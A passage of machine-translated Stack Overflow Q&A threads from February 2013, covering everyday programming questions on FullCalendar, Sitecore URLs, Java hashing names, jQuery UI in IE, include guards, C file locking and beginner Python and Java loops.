> 有时，我们中的一个人会使用脚本清除这些分支，但我们认为将此步骤作为我们在 GitHub.com 上的常规工作流程的一部分来处理会更好。
> 
> 从今天开始，合并拉取请求后，您将看到一个删除延迟分支的按钮：

![在此处输入图像描述](../Images/fb08eab0dec9cce9450bf8312a302d74.png)

您不想删除该分支的唯一情况是：

*   如果你打算在你当前的补丁上花费，重用同一个分支
*   或者您已经开始了一些尚未合并/接受的提交，如果您删除了分支，那将会丢失：

> 如果拉取请求在没有被合并的情况下关闭，该按钮看起来会有所不同，以警告您删除未合并的提交：

![在此处输入图像描述](../Images/08f18d6e9c624f79f00e653d754094a1.png)

这样可以避免任何意外，过早删除分支。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-15T21:25:33.943

When it is merged into master, you can safely delete it.

# php - Fullcalendar 使用 jquery 和 PHP 获取事件

> ID：14903520
> 
> 赞同：0
> 
> 时间：2013-02-15T21:22:23.683
> 
> 标签：php, jquery, ajax, json, fullcalendar

我正在使用 JQuery FullCalendar 1.5.4 版，我想用 JQuery 设置事件。

我使用 $.getJSON 来调用一个 php 文件，该文件在我的 MySQL 数据库中检索我的数据。

当我用 limit 0,1 限制我的查询时，一切正常。该事件已成功显示在日历中。但是，当我的 php 返回一个对象数组时，我得到了错误：`Uncaught TypeError: Cannot call method 'replace' of null`

我的 PHP 页面返回的 JSON 数据如下所示：

```
[{"id":1,"title":"Halloween ","start":"2013-02-08 00:00:00","end":"2013-02-08 00:00:00","allDay":true},{"id":2,"title":null,"start":"2013-02-12 00:00:00","end":"2013-02-12 00:00:00","allDay":true},{"id":3,"title":"Sortie Valcartier","start":"2013-02-20 00:00:00","end":"2013-02-20 00:00:00","allDay":true}] 
```

PHP 代码如下所示：

```
<?php

//header('content-type: application/json; charset=utf-8');

mysql_connect("localhost","root") or die (" NOPE . [" . mysql_error() . "]");
mysql_select_db("garderie");

$query = "select a.ActiviteID as ActiviteID,a.nom as Nom , cd.datedujour as Jour from activites a 
          inner join calendrieractivite ca 
          on a.activiteid = ca.activiteid
          inner join calendrierdate cd
          on ca.dateid = cd.dateid
        ";
$result = mysql_query($query);

$events = array();

$i = 0;

$year = date('Y'); 
$month = date('m');

while($ligne = mysql_fetch_array($result))
{
    $id = $ligne["ActiviteID"];
    $nom = $ligne["Nom"];

    $e = array(
        'id' => (int)$id,
        'title' => $nom,            
        'start' => $ligne["Jour"],//$start,
        'end' => $ligne["Jour"],
        'allDay' => true
    );
    $events[$i] = $e;

    $i++;        
}

mysql_close();

echo (json_encode($events));
?> 
```

jquery 代码看起来像这样

```
...
$.getJSON('json_events.php', null, function(data){
    $('#calendar').fullCalendar({
        events: data,
... 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-15T21:27:29.983

您需要在 php 端过滤您的事件，并确保每个事件都有一个标题。当您将空标题传递给 FullCalendar 时，它似乎会破坏脚本。

```
{"id":2,"title":null,"start":"2013-02-12 00:00:00","end":"2013-02-12 00:00:00","allDay":true} 
```

# url - 如何在 Sitecore 的 URL 中禁用语言嵌入？

> ID：14903521
> 
> 赞同：8
> 
> 时间：2013-02-15T21:22:25.573
> 
> 标签：url, sitecore, sitecore6

设置简单的 Sitecore 站点后，页面链接有时会包含当前语言：

```
http://example.com/item.aspx
http://example.com/en/item.aspx 
```

我想禁用此行为，以便所有链接都指向`http://example.com/item.aspx`没有语言作为路径的一部分。如何才能做到这一点？

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2013-02-15T21:22:25.573

web.config 有一个配置设置，用于配置选项的`<linkManager>`位置`languageEmbedding`：

```
<linkManager defaultProvider="sitecore">
    <providers>
        <clear/>
        <add name="sitecore" ... languageEmbedding="asNeeded" ... />
    </providers>
</linkManager> 
```

`languageEmbedding`选项包括：

*   如所须
*   总是
*   绝不

更改要使用的配置`languageEmbedding="never"`将阻止语言显示在 URL 中，同样`languageEmbedding="always"`会强制语言始终显示在 URL 中。

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2013-02-16T19:21:53.193

您不应使用“asNeeded”选项，因为它可能会导致同一页面出现多个 url。使用对 SEO 更友好的“从不”或“总是”

# java - MessageDigest.getInstance("SHA") 返回什么特定的哈希算法？

> ID：14903539
> 
> 赞同：29
> 
> 时间：2013-02-15T21:23:48.830
> 
> 标签：java, cryptography, undefined-behavior

`MessageDigest.getInstance("SHA")`似乎工作并给了我一个`MessageDigest`，但我不知道它给了我什么算法。

是 SHA-1 还是 SHA-0 还是 ..？

* * *

我对我的机器上发生的事情不感兴趣。我想知道它是否会为所有有效的 Java 实现返回 sha0 或 sha1（或者它是未定义的）。

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2013-02-15T22:55:52.230

[JCE 规范](http://docs.oracle.com/javase/1.5.0/docs/guide/security/CryptoSpec.html#AppA)列出了预期实现支持的标准名称。指定了“SHA-1”，以及 SHA-256、SHA-384 和 SHA-512。“SHA”、“SHA-0”和“SHA-2”不是标准名称，因此可能根本不受支持。您不能保证“SHA”会返回什么，如果有的话，因为它不在标准中。

* * *

## 回答 #2

> 赞同：19
> 
> 时间：2013-02-15T21:35:46.580

SHA-0 已过时。与 Java JCE MessageDigest 一起使用时，对于某些 JCE 提供程序，SHA == SHA-1。顺便说一句，SHA-1 在当今的计算机和技术中被认为是不安全的。SHA-512 对于几乎任何东西来说仍然是安全的。SHA-256 仍然适用于大多数事情。

您可以列出与此代码一起使用的 Java 版本中可用的协议。（我在[这里](http://mindprod.com/jgloss/jce.html)得到它）：

```
import java.security.Provider;
import java.security.Security;

public class JceLook {

    public static void main(String[] args) {
        System.out.println("Algorithms Supported in this JCE.");
        System.out.println("====================");
        // heading
        System.out.println("Provider: type.algorithm -> className" + "\n  aliases:" + "\n  attributes:\n");
        // discover providers
        Provider[] providers = Security.getProviders();
        for (Provider provider : providers) {
            System.out.println("<><><>" + provider + "<><><>\n");
            // discover services of each provider
            for (Provider.Service service : provider.getServices()) {
                System.out.println(service);
            }
            System.out.println();
        }
    }
} 
```

它将显示所有可用算法的此类信息。（请注意，这是上述程序针对 Oracle/Sun Java 6 的某些更新级别的实际输出，它表明 SHA 等效于 SHA-1 和 SHA1。您可以将三个字符串中的任何一个传递给 MessageDigest 并获得相同的结果. 但这取决于密码学提供程序（JCE），可能不一样。）

```
SUN: MessageDigest.SHA -> sun.security.provider.SHA
  aliases: [SHA-1, SHA1]
  attributes: {ImplementedIn=Software} 
```

如果您加载其他供应商（例如 BouncyCastle），它也会显示这些供应商。

# jquery - jquery-ui 1.9.1 ui-draggable 不适用于 ie9 和 ie10

> ID：14903542
> 
> 赞同：3
> 
> 时间：2013-02-15T21:24:02.797
> 
> 标签：jquery, resize, internet-explorer-9, jquery-ui-draggable, internet-explorer-10

我无法在 IE 9 和 10 中使 .draggable 工作。使用的主要 javascript 包是：jquery-ui-1.9.1.min.js 和 jquery-1.8.2.min.js

代码基本上是这样的：

```
creation.texts.resize = function(){

  jQuery('.modification-text.active .creation-resize-handler').draggable({
    start: function(event, ui){
      ... some code ...
    },
    drag: function(event, ui){
      ... lots of code ...
    },
    stop: function(event, ui){

       ... some code ...

      creation.texts.resize();
    }
  });
} 
```

它与 chrome firefox 等完美配合。有人遇到过类似的问题吗？

**更新：**我刚刚在 jsfiddle.net 中尝试了一个小示例代码，工作正常。代码非常庞大，一定是其他问题。

**更新 2：**似乎可拖动元素不可点击：我在同一页面上做了一些单独的测试，我可以使用 .draggable 就好了。我向错误元素添加了 onclick 警报，它没有在 IE 中触发。这是该区域中元素的示例 html 代码：

```
<div id="modification-limit" style="left: 25px; top: 34.5px; width: 290px; height: 290px;">
  <div class="modification-text text-active active first-text ui-draggable" id="text_1" style="left: 97px; top: 24px; z-index: 0; border: 1px dashed rgb(204, 204, 204);">
    <img src="/images/creation/rotate.png" class="creation-rotate" style="display: block;">
    <div class="creation-rotate-handler ui-draggable" style="display: block;"></div>
    <img src="/images/creation/resize.png" style="z-index: 100; display: block;" class="creation-resize">     
    <div class="creation-resize-handler ui-draggable" style="z-index: 50000; display: block;" onclick="alert('clicked');">
    </div><img src="/images/creation/close.png" class="creation-close-text" style="display: block;">
    <div> ... </div>
  </div>
</div> 
```

为简单起见，我删除了很多 html（很多“数据-..”）。希望问题不是我删除的代码的一部分。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-09T13:25:13.817

我有同样的问题，使用 IE10，使用 JQuery 1.8.3 和 JQuery UI 1.9.2

我在运行时创建了一些 div 控件（基于我从 JSON Web 服务加载的数据），并使用 JQuery UI 将它们设置为 Draggable。但是对于 IE9 和 IE10，他们甚至没有注册他们应该被拖动。

例如，当用户将鼠标悬停在光标上时，我将光标更改为“移动”光标。

```
newDivElement.draggable({
   cursor: "move",
   drag: function (event, ui) {
       alert("Hey !  You're dragging !");
   }
   . . . 
}); 
```

原谅陈词滥调，它在 Chrome、Firefox 或带有 Google Chrome Frame 的 IE8 上运行良好。

但是在 IE9 或 IE10 上，当用户将鼠标悬停在这些 div 上时，没有任何反应。光标没有改变，拖动功能也没有启动。

出于兴趣/绝望，我尝试了其他地方的建议，在我的 div 和 div 周围的任何其他 HTML 元素上将 **-ms-touch-action css 设置为“none”。**

它没有任何区别。

```
 $(".cssWorkflowStep").css('-ms-touch-action', 'none');
    $(".cssCanvas").css('-ms-touch-action', 'none');
    $(".ui-draggable").css('-ms-touch-action', 'none');
    $("#divCanvasWrapper").css('-ms-touch-action', 'none');
    $("#divWorkflowDiagram").css('-ms-touch-action', 'none'); 
```

我还使用了 Chrome 的“检查元素”菜单项，以检查我的新 div*是否正在*获取这些新**的 -ms-touch-action**值，并且显示它们是（但 Chrome 然后删除了这个 css 名称，因为它没有知道它是什么）。

我今天过得不好...

我在以下页面上找到了解决方案：

[IE10 不处理点击事件 | 帮助使用 MSPointer](https://stackoverflow.com/questions/14172630/ie10-is-not-handling-click-events-help-using-mspointer)

（振作起来……这太荒谬了。）

我必须将我的 div 的背景颜色设置为白色......然后让这个背景颜色不可见。然后，IE9 和 IE10 会让我在屏幕上单击或拖动我的**div 。**

```
background-color:#FFFFFF; opacity:0; 
```

如果有人需要我，我会在酒吧里哭。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-15T21:27:58.577

Looks like you are missing the comma's in your selection, did you try this?

jQuery('.modification-text.active,.creation-resize-handler').draggable()...

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-07-12T07:56:46.927

可能的解决方案：

1.  背景颜色设置为任何颜色（例如白色），如“Mike Gledhill”所述
2.  当您需要 div 的透明背景时，在该 div 内添加使用 1x1 透明间隔 gif 并将其拉伸以填充整个 div 空间。这将让你拖动那个透明的 gif

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-10-22T13:46:44.620

Sounds like a "compatibility mode" issue. This tag placed in the page `<head>` worked for my situation.

```
<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" /> 
```

[More on the topic here in this Stack Overflow post.](https://stackoverflow.com/questions/6771258/whats-the-difference-if-meta-http-equiv-x-ua-compatible-content-ie-edge-e)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-11-20T08:48:40.873

将 jquery ui 升级到最新版本（1.11.4）解决了我的问题。

# c++ - 头球后卫和编译指示一次

> ID：14903547
> 
> 赞同：1
> 
> 时间：2013-02-15T21:24:28.047
> 
> 标签：c++

1.我看到很多地方，Header guards和pragma once也以特定的顺序一起使用（顺序真的重要吗？）

2.另外一个疑问是默认情况下，每当VS IDE生成一个新的类文件时，它都会将#pragma一次放入实现文件（.cpp）。这真的需要吗？

```
#ifndef MYHEADER_H
#define MYHEADER_H

#pragma once

//my set of includes 
```

哪种是标头保护的正确方法，或者更确切地说是阻止多个包含？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-15T21:31:57.613

```
#pragma once 
```

是非标准的，尽管许多流行的编译器/预处理器都支持。请参阅[#pragma once 是安全包含守卫吗？](https://stackoverflow.com/q/787533/78845)

```
#ifndef MYHEADER_H
#define MYHEADER_H
#endif // ndef MYHEADER_H 
```

保证适用于所有 C++ 编译器/预处理器。

同时使用两者是没有意义的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-15T21:31:42.557

“#pragma once”是特定于编译器的，可能不可移植。“#ifndef/#define/#endif”更便携，适用于所有预处理器。

# c++ - “Accelerated C++: Practical Programming by Example”仍然是最新的吗？

> ID：14903551
> 
> 赞同：11
> 
> 时间：2013-02-15T21:24:34.860
> 
> 标签：c++

我需要学习C++。因为我喜欢这本书的概念，而且我已经可以用其他几种语言进行编程，所以我认为[“Accelerated C++: Practical Programming by Example”](https://rads.stackoverflow.com/amzn/click/com/020170353X)是最好的选择。但是，这本书已经超过 12 年了。选择它仍然是一个好主意，还是我会错过该语言太多重要的新特性？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2013-02-15T21:33:49.153

它仍然是最好的书之一。它基于 C++98，但 C++03 修复的 bug 比其他任何东西都多，而且大多数程序员无论如何都不能使用任何更新的东西。与大多数已经存在了一段时间的语言一样，最近的演变可以被认为是微调，或者是处理新问题（如线程）的附加功能。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-15T21:39:03.370

我读了一些 C++ 书籍，我推荐 C++ Primer。作者教授语言的方式非常有趣。除了它是一本“沉重”的书外，您还可以更深入地学习该语言以及如何避免错误。

# java - 是否有 JDK 或 Guava 方法可以将 null 转换为空列表？

> ID：14903554
> 
> 赞同：26
> 
> 时间：2013-02-15T21:24:43.583
> 
> 标签：java, collections, guava

JDK或Google Guava中是否有类似的方法

```
public static <T> Collection<T> safe(Collection<T> collection) {
    if (collection == null) {
        return new ArrayList<>(0);
    } else {
        return collection;
    }
} 
```

例如，如果某些内容返回空列表，则可以很容易地在增强的循环中不崩溃

```
for (String string : CollectionUtils.safe(foo.canReturnANullListOfStrings())) {
    // do something
} 
```

不会崩溃。

我环顾四周，但找不到任何这样的方法，我想知道我是否错过了它，或者是否有原因导致这种方便的方法不方便因此不包括在内？

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2013-02-15T21:31:13.560

```
Objects.firstNonNull(list, ImmutableList.<Foo>of()); 
```

不需要专门的方法，这[确实](https://stackoverflow.com/a/6921270/869736)是我们建议您立即使用的解决方案，只要您从一个理想情况下不应该首先这样做的顽皮 API 获得可能为空的集合。

* * *

## 回答 #2

> 赞同：23
> 
> 时间：2016-08-03T03:50:43.343

Apache Collections 4 有一个通用方法`ListUtils.emptyIfNull(List<T> list)`

这是文档：[https ://commons.apache.org/proper/commons-collections/apidocs/org/apache/commons/collections4/ListUtils.html](https://commons.apache.org/proper/commons-collections/apidocs/org/apache/commons/collections4/ListUtils.html)

* * *

## 回答 #3

> 赞同：18
> 
> 时间：2016-12-09T13:52:32.697

在 Java 8 中可以这样使用：

```
Optional.ofNullable(foo.canReturnANullListOfStrings()).orElse(Collections.emptyList()); 
```

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2018-09-14T11:07:29.907

Java 9 的更新： `java.util.Objects.requireNonNullElse(collection, List.<T>of())`

`<T>`仍然是必需的。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-02-15T21:27:29.597

因此，据我所知，不存在这种功能。但是，正如您在上面显示的那样，编写一个是微不足道的。为什么它可能未被包括在内的原因是因为它具有特定的含义，并且在传递时`null`返回空可能不合适。`Collection`通常（根据我的经验），当一个空值进入系统时，链上的某些东西会失败，或者无效值没有得到适当的清理。

# c - C：线程安全日志记录到文件

> ID：14903555
> 
> 赞同：5
> 
> 时间：2013-02-15T21:24:50.650
> 
> 标签：c, file, thread-safety

我正在尝试编写一个线程安全的 C 日志记录函数，但文件 IO 存在一些严重问题。所以，基本上，我从一个有趣的`fopen`调用开始，让我以二进制更新模式打开日志：

```
FILE *log, *start;
int timeout = 0, error;

//make file (fails if file exists)
log = fopen(LOG_FILE, "wx");

//Close the file if a new one was created
if(log)
   fclose(log);

//Open file in update mode (it must exist for this)
log = fopen(LOG_FILE, "rb+"); 
```

接下来，我锁定文件，如果另一个线程锁定它的时间过长，则合并一个超时：

```
//Init other file pointer
start = log;

//Lock file (with timeout)
rewind(start);
error = lockf(fileno(start), F_TLOCK, 0);
while( error == EACCES || error == EAGAIN)
{
  //sleep for a bit
  usleep(LOCKED_FILE_RETRY_TIME);

  //Incremement timeout
  timeout += LOCKED_FILE_RETRY_TIME;

  //Check for time out
  if(timeout > LOCKED_FILE_TIMEOUT)
  {
     return;
  }

  //Retry the lock operation
  error = lockf(fileno(start), F_TLOCK, 0);
} 
```

最后，我将所需的消息添加到文件末尾，解锁并关闭文件：

```
//Print log entry
fseek(log, 0, SEEK_END);
fwrite((const void*) log_msg, 1, strlen(log_msg), log);

//Unlock the block
rewind(start);
lockf(fileno(start), F_ULOCK, 0);

//Close file
fclose(log); 
```

但是，似乎大多数消息都在日志​​中被覆盖，而不是附加，几乎就像`fopen`拍摄了文件的“快照”，等待它被解锁，然后写入文件末尾的位置如果另一个过程没有添加到它。有谁知道我该如何解决这个问题？

顺便说一句，我希望处于二进制更新模式，因为我最终将添加一些修剪功能，以确保日志文件不超过特定大小，这对我来说更容易通过工作`fseek`调用和 R/W 功能来完成。

任何提示表示赞赏。预先感谢！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-15T21:28:50.907

您在解锁之前没有调用`fflush()`文件指针。`fclose()`这样，您的日志消息将保留在 stdio 缓冲区中，以便在不再持有锁时写出。

要解决此问题，`fflush(log)`请在解锁操作之前添加一个，或者只是将其移动到`fclose(log)`它之前。

# c++ - 如何设置一个字符串数组，其中包含将通过数组显示在 iphone 文本上的字符串？

> ID：14903559
> 
> 赞同：0
> 
> 时间：2013-02-15T21:25:03.053
> 
> 标签：c++, iphone, objective-c, arrays

我是 iphone 开发的新手，但我以前做过 android。以下是我在 java 中所做的事情，我想将其转换为 iphone。

```
 public class RelationshipTipsActivity extends Activity implements
    OnClickListener {
private static final int SWIPE_MIN_DISTANCE = 120;
private static final int SWIPE_MAX_OFF_PATH = 250;
private static final int SWIPE_THRESHOLD_VELOCITY = 200;
private GestureDetector gestureDetector;

View.OnTouchListener gestureListener;

String facts[] = {"Coming soon",
        "Coming soon", };

TextView display, display1;
TextView counter;
Button begin;
Button next;
Button previous;
Button random;
Random myRandom;

int index = facts.length;

/** Called when the activity is first created. */
@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(starting.rt.R.layout.relationship);

    AdView ad = (AdView) findViewById(R.id.ad);
    ad.loadAd(new AdRequest());

    display1 = (TextView) findViewById(starting.rt.R.id.Begin);
    display = (TextView) findViewById(starting.rt.R.id.tvResults);
    counter = (TextView) findViewById(starting.rt.R.id.tvCounter);
    next = (Button) findViewById(starting.rt.R.id.Next);
    previous = (Button) findViewById(starting.rt.R.id.Previous);
    random = (Button) findViewById(starting.rt.R.id.Random);

    next.setOnClickListener(this);
    previous.setOnClickListener(this);
    random.setOnClickListener(this);
    // display.setOnTouchListener(this.gestureListener);
    myRandom = new Random();

    // gestureDetector = new GestureDetector(new MyGestureDetector());
    // gestureListener = new View.OnTouchListener() {
    // public boolean onTouch(View v, MotionEvent event) {
    // return gestureDetector.onTouchEvent(event);
    // }

    // };
}

private void showDisplay() {
    display.setText(facts[index]);
    counter.setText(String.valueOf(index + 1) + "/"
            + String.valueOf(facts.length));
}

public void onClick(View arg0) {
    // TODO Auto-generated method stub
    switch (arg0.getId()) {
    case starting.rt.R.id.Next:
        index++;
        if (index > facts.length - 1) {
            index = 0;
        }
        showDisplay();

        break;

    case starting.rt.R.id.Previous:
        index--;
        if (index < 0) {
            index = facts.length - 1;
        }
        showDisplay();
        break;

    case starting.rt.R.id.Random:
        index = (myRandom.nextInt(facts.length) - 1);
        if (index < 0) {
            index = facts.length - 1;
        }
        showDisplay();
        break;

    }

} 
```

}

您将如何将代码中的内容从 android 转换为 iphone。

到目前为止，我有这个适用于 iphone 的代码，我只是不知道从那里去哪里。

```
(IBAction) clicked:(id)sender{
NSArray *titleOfButton = [sender titleForState:UIControlStateNormal];
//NSString *newLabelText = [[NSString alloc]initWithFormat:@"%@", titleOfButton];
NSArray *initializedNSArray = [NSArray arrayWithObjects: @"red", 
                               @"blue", 
                               @"green", 
                               @"yellow", 
                               nil];
labelsText.text = initializedNSArray;
[initializedNSArray release]; 
```

}

我希望能够在 Iphone 视图中显示这些字符串。并且能够单击下一个或上一个按钮转到下一个或上一个字符串，可以是从蓝色到红色或红色到蓝色。基本上，如果有任何教程可以帮助我，或者如果您知道如何提供帮助，我将不胜感激。谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-15T21:39:24.640

为什么没有一个`int`变量与数组中字符串的当前位置和两个方法`goPrev`-`goNext`增加和减少`int`变量。

在界面中：

```
UIButton *btn;
int step;
NSArray *titles; 
```

在实施中：

```
-(void)setup {
titles = [NSArray arrayWithObjects:@"Title 1",@"Title 2",@"Title 3",@"Title 4", nil];
btn = [UIButton buttonWithType:UIButtonTypeCustom];
}

-(void)goPrev {
if (step>0) {
    step--;
}
[btn setTitle:[titles objectAtIndex:step] forState:UIControlStateNormal];
}

-(void)goNext {
if (step<titles.count-1) {
    step++;
}
[btn setTitle:[titles objectAtIndex:step] forState:UIControlStateNormal];
} 
```

# jquery - How can I create tabs (jQuery UI) with jQuery 1.8.3

> ID：14903560
> 
> 赞同：0
> 
> 时间：2013-02-15T21:25:03.433
> 
> 标签：jquery, jquery-1.4, jquery-1.8

I used to create tabs by calling `$(element).tabs(...)` when I was using jQuery 1.4.4\. Now, with jQuery 1.8.3, I get an error:

> Uncaught TypeError: Object # has no method 'tabs'

Why such an error? The only difference is the version of jQuery (not even jQuery UI, just jQuery).

NB I'm using jQuery-UI version 1.10.0

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-20T17:10:53.960

我发现了问题，这与 jQuery 的冲突版本有关。

基本上，drupal 加载 1.4.4，但我想使用 1.8.3，所以我这样做：

```
var drupalsJQuery = jQuery;
// Load jq.1.8.3.js
// Load jq.ui.1.9.2.js

// MY CODE GOES HERE

$ = jQuery = drupalsJQuery; // Restore $ and jQuery to their original value (the jQuery object of Drupal's version of jQuery (1.4.4)) 
```

在 MY CODE GOES HERE 部分，如果我写`console.log($().jquery);`，它会打印出`1.8.3`，这就是我想要的，所以我认为我的版本冲突已经结束。我没有注意到的是它并不总是有效。举这个例子（仍然在我的代码放在这里部分）：

```
console.log($().jquery);
// Prints 1.8.3
$(document).ready(function () {
  console.log($().jquery);
  // Prints 1.4.4 !!!!
}); 
```

如您所见，版本在`$(document).ready(function () { /*HERE*/ });`

解决方案是将 jQuery 对象作为参数传递给匿名函数：

```
console.log($().jquery);
// Prints 1.8.3
$(document).ready(function ($) {
  console.log($().jquery);
  // Prints 1.8.3 !!!!
}); 
```

现在版本保持正确。

我无法正确解释这种行为，所以也许有人可以根据这些发现提出更好的答案......另一个问题是我最初的问题毕竟是离题的......不太确定在这里做什么使其与其他用户相关。

# php - 使用 PHP 从 WMI 查询中检索 IP 地址

> ID：14903562
> 
> 赞同：0
> 
> 时间：2013-02-15T21:25:23.420
> 
> 标签：php, windows, wmi

我正在尝试编写一个脚本来检索我网络上远程主机的 NIC 卡信息。

这是我的查询：

```
$wmi_networkadapter = $obj->ExecQuery("Select * from Win32_NetworkAdapter WHERE NetConnectionID LIKE 'Local Area Connection'"); 
```

这是输出：

```
 foreach ($wmi_networkadapter as $wmi_call) {
        //Caption
        $Caption = $wmi_call->Caption;
        echo "<b>Caption:</b> $Caption<br>";

        //MACAddress
        $MACAddress = $wmi_call->MACAddress;
        echo "<b>MACAddress:</b> $MACAddress df<br>";                                       
    } 
```

我可以获取 Mac 地址和标题（NIC 名称），但我不知道如何获取 IP 地址。谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-15T21:41:02.093

我没有任何专门使用 WMI 的经验，但是调用时会得到什么结果`var_dump($wmi_call)`？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-19T21:13:46.393

行。我能够获得这样做的IP地址。

使用此查询：

```
$wmi_networkadapter = $obj->ExecQuery("Select * from Win32_NetworkAdapterConfiguration WHERE IPENabled = 'True'"); 
```

PHP：

```
foreach ($wmi_networkadapter as $wmi_call) {
    //Caption
    $Caption = $wmi_call->Caption;
    echo "<b>Caption:</b> $Caption<br>";

    //MACAddress
    $MACAddress = $wmi_call->MACAddress;
    echo "<b>MACAddress:</b> $MACAddress<br>";      

    //IP ADDRESS
    $ip = $wmi_call->IPAddress;
    foreach ($ip as $key => $value) {
     echo $value;
    }
} 
```

# python - 简单输入和随机数的 Python 辅助

> ID：14903563
> 
> 赞同：0
> 
> 时间：2013-02-15T21:25:23.767
> 
> 标签：python, random, input, python-3.x

我试图让这段简单的代码运行，它迭代一个由四个随机数组成的序列，直到它与用户输入的四位数字相匹配。我知道有更简单的方法可以做到这一点，但我只是想知道为什么它不起作用。程序将编译，当它到达 while 检查时，终端的屏幕永远不会更新，程序也不会终止。谢谢

```
import random
attempts = 0
pin = input("Please enter your four digit pin: ")
str_pin1 = str(pin)

while True:
    digit1 = random.randint(0,9)
    digit2 = random.randint(0,9)
    digit3 = random.randint(0,9)
    digit4 = random.randint(0,9)
        digit1 = str(digit1)
        digit2 = str(digit2)
        digit3 = str(digit3)
        digit4 = str(digit4)
    attempts = attempts +1

    if digit1 == str_pin[0] and digit2 == str_pin[1] and digit3 == str_pin[2] and   str_pin[3]:)
        break
print('it took', attempts, 'for random number to find your code') 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-15T22:02:17.077

你可以这样做：

```
import random
attempts = 0
pin = input("Please enter your four digit pin: ")
guess = ""

while guess != pin:
    guess = str(random.randint(0,10000))
    while len(guess) < 3:
        guess = "0" + guess
    attempts = attempts +1

print('it took', attempts, 'for random number to find your code') 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-15T21:33:41.330

一个简单的错字：您的陈述`digit2`的第二种和第三种情况都有`if`，所以除非`pin`在两个地方都有相同的数字，否则它永远不会匹配。

此外，整数与字符串的比较永远不会相等。您需要将每个随机数字转换为字符串。

# java - 我需要帮助在 Java 中制作某种循环情况

> ID：14903568
> 
> 赞同：0
> 
> 时间：2013-02-15T21:25:35.753
> 
> 标签：java, loops, numbers

**编辑**

谢谢你们的帮助。这是帮助我的答案：[https ://stackoverflow.com/a/14903642](https://stackoverflow.com/a/14903642)

这是完整的工作代码： http: [//pastebin.com/1kbipuAZ](http://pastebin.com/1kbipuAZ)

**结束编辑**

我应该制作一个简单的 cmd 游戏，要求用户输入一定范围内的数字。然后玩家 2 应该尝试猜测这个数字是多少。程序不断告诉“高”或“低”，直到玩家猜出数字。我想我应该使用一些 if/else 语句，也许还有 while 循环，但我不知道以什么方式。我要么得到一个无限循环，要么它在我想要它之前停止。这是我所拥有的：

```
 import java.io.*;

class game
{
    public static void main (String[]args) throws IOException
    {
        InputStreamReader inStream = new InputStreamReader(System.in);
        BufferedReader stdin = new BufferedReader(inStream);

        String inData;

        System.out.println("Welcome to The Game. Player One, please enter an                                integer higher than 0, and less than 1000...\n");

        inData = stdin.readLine();

        int number = Integer.parseInt(inData);

        if(number >= 1000 || number <= 0)
        {
            System.out.println("Sorry, that number is out of the acceptable     range on numbers...\n");
        }
        else
        {
            System.out.println();
        }

        String f1;

        System.out.println("Player Two, Please enter a guess as to what Player     One's number is...\n");

        f1 = stdin.readLine();

        int guess = Integer.parseInt(f1); 

        while(guess < number)
        {
            if(guess != number)
            {
                System.out.println("Higher. Please Guess Again...\n");
            }
            else
            {
                System.out.println();
            }
            break;

        }
        while(guess > number)
        {
            if(guess != number)
            {
                System.out.println("Lower. Please Guess Again...\n");
            }
            else
            {
                System.out.println();
        }
            break;

        }
        if(number==guess)
        {
            System.out.println("Congratulations. Thank you for     playing...\n");
        }
        else
        {
            System.out.println();
        }

    }
} 
```

我尝试了循环和语句等的不同组合，但我不能走得太远。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-15T21:31:54.397

你的代码几乎是正确的......

当第二个玩家猜出正确的数字时，您需要跳出循环。所以，

```
while(guess != number) 
```

在循环中，您需要进行比较和打印。此外，您每次都需要在循环中获取输入。

代码如下：

```
 f1 = stdin.readLine();
    int guess = Integer.parseInt(f1); 

    while(guess != number)
    {
        if(guess < number)
        {
            System.out.println("Higher. Please Guess Again...\n");
        }
        else if(guess > number)
        {
            System.out.println("Lower. Please Guess Again...\n");
        }

        f1 = stdin.readLine();
        guess = Integer.parseInt(f1); 
    } 
```

*****已编辑* *******

 **完整的工作程序如下：

```
 import java.io.*;

class game
{
    public static void main (String[]args) throws IOException
    {
        InputStreamReader inStream = new InputStreamReader(System.in);
        BufferedReader stdin = new BufferedReader(inStream);

        String inData;

        System.out.println("Welcome to The Game. Player One, please enter an                                integer higher than 0, and less than 1000...\n");

        inData = stdin.readLine();

        int number = Integer.parseInt(inData);

        if(number >= 1000 || number <= 0)
        {
            System.out.println("Sorry, that number is out of the acceptable     range on numbers...\n");
        }
        else
        {
            System.out.println();
        }

        String f1;

        System.out.println("Player Two, Please enter a guess as to what Player     One's number is...\n");

        f1 = stdin.readLine();
        int guess = Integer.parseInt(f1); 

        while(guess != number)
        {
            if(guess < number)
            {
                System.out.println("Higher. Please Guess Again...\n");
            }
            else if(guess > number)
            {
                System.out.println("Lower. Please Guess Again...\n");
            }

            f1 = stdin.readLine();
            guess = Integer.parseInt(f1); 
        }

    }
} 
```

**这是输出：**

欢迎来到游戏。玩家一，请输入一个大于0小于1000的整数...

10

玩家二，请输入猜测玩家一的号码是什么...

2 更高。请再猜一猜...

5 更高。请再猜一猜...

7 更高。请再猜一猜...

12 降低。请再猜一猜...

11 降低。请再猜一猜...
